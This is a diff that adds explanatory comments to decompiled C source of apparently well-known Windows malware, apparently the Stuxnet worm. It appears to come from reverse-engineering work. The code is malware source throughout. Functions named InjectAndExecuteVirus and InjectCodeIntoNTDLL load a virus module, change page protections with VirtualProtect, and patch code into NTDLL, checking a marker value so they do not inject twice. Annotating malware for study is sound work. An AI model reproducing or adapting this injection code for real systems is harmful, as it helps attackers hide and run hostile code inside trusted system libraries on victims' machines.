@@ -19,7 +19,7 @@
 #include "CodeBlock.h"
 
 // 98% (C) CODE MATCH
-INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader) //defined in define.h, defines image of ASM code blocks (segments and their addresses and sizes, ExecuteLibrary?, VirusModuleSection?, AlignAddresses?)
+INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader) //param type defined in define.h, defines image of ASM code blocks (segments and their addresses and sizes, ExecuteLibrary?, VirusModuleSection?, AlignAddresses?)
 {
 	HANDLE hThread; // [sp+0h] [bp-98h]@8
 	HMODULE pVirusModule; // [sp+4h] [bp-94h]@5
@@ -30,13 +30,13 @@ INT32 BLOCK4_InjectAndExecuteVirus(PASM_CODE_BLOCKS_HEADER sASMCodeBlocksHeader)
 	GENERAL_INFO_BLOCK sInfoBlockCopy; // [sp+18h] [bp-80h]@1
 
 	pVirusModuleSection = (PVIRUS_MODULE_BLOCKS_HEADER)sASMCodeBlocksHeader->VirusModuleSection;
-	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0));
+	pHardAddrs = (PHARDCODED_ADDRESSES)(sASMCodeBlocksHeader->ASMBlock1Segment.SegmentAddress + _SIZE(&g_hardAddrs, __ASM_BLOCK1_0)); //take segment address of ASMBlock1 as it appears in provided blocks header, add the offset of (addr(g_hardAddrs) - addr(...
 
 	BLOCK4_memcpy(&sInfoBlockCopy, pVirusModuleSection, sizeof(GENERAL_INFO_BLOCK));
 
 	sInfoBlockCopy.OriginalAddress = ((UINT32)&sInfoBlockCopy ^ XADDR_KEY);
 	sInfoBlockCopy.UnknownZero0 = 0;
-	sInfoBlockCopy.AlignAddressesFunction = sASMCodeBlocksHeader->AlignAddresses;
+	sInfoBlockCopy.AlignAddressesFunction = sASMCodeBlocksHeader->AlignAddresses; //value not referenced in this fxn, likely setup for when used in calls
 
 	iResult = BLOCK4_LoadVirusModuleInfo(pHardAddrs, &sInfoBlockCopy, (PVOID)pVirusModuleSection->VirusModuleSegment.SegmentAddress, pVirusModuleSection->VirusModuleSegment.SegmentSize);
 	if(iResult) return iResult;
@@ -214,6 +214,7 @@ void BLOCK4_CopyDataIntoMapView(PVOID pVirusModule, PIMAGE_NT_HEADERS pImageNT, 
 }
 
 // 99% (C) CODE MATCH
+//inject Block0 into NTDLL, then call Block1 (apparently _0), passing in NTDLL_Entry
 INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, PHARDCODED_ADDRESSES pHardAddrs)
 {
 	HMODULE hHandleNTDLL; // [sp+8h] [bp-Ch]@1
@@ -223,7 +224,7 @@ INT32 BLOCK4_InjectCodeIntoNTDLL(ASM_CODE_BLOCKS_HEADER *sASMCodeBlocksHeader, P
 	hHandleNTDLL = pHardAddrs->NTDLL_DLL;
 	if(!pHardAddrs->NTDLL_DLL) return 0;
 
-	NTDLL_Entry = (void *)(hHandleNTDLL + 16);
+	NTDLL_Entry = (void *)(hHandleNTDLL + 16); //hardcoded 16bytes offset into our NTDLL addr for entry point
 	if(*(_DWORD *)(hHandleNTDLL + 16) == 0xAB49103B) return 0; // Check if the code has been already injected
 
 	if(pHardAddrs->VirtualProtect(hHandleNTDLL, 0x1000, PAGE_EXECUTE_WRITECOPY, &dwOld))
